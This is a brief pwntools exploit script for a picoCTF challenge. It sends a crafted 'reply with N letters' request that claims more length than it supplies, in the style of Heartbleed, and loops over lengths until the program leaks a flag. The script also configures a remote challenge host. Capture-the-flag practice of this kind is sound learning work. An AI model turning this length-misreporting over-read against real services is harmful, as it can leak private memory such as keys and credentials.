#!/usr/bin/python3
from pwn import *

exe = context.binary = ELF("./xkcd", checksec=False)
#libc = ELF("./libc-2.31.so", checksec=False)

info = lambda msg, x: log.info(msg + hex(x))
s = lambda data: p.send(data)
sl = lambda data: p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data: p.sendlineafter(msg, data)

if args.REMOTE:
    p = remote("rhea.picoctf.net", 53917)
else:
    p = process()

if args.GDB:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '55']
    gdb.attach(p, gdbscript='''
        b*0x000000000040114F 
	    c
	''')
    #input()


for i in range(1, 30):
    p.close()
    log.warn(i)

    payload = b"SERVER, ARE YOU STILL THERE?"
    payload += b" IF SO, REPLY \""
    payload += b"A"*512 + b"\"0"
    payload += f"({0x200 + i} LETTERS)".encode()
    
    p = process()
    sl(payload + b'\n')
    output = p.recvall()
    if b'}' in output:
        print(output)
        exit(0)

p.interactive()
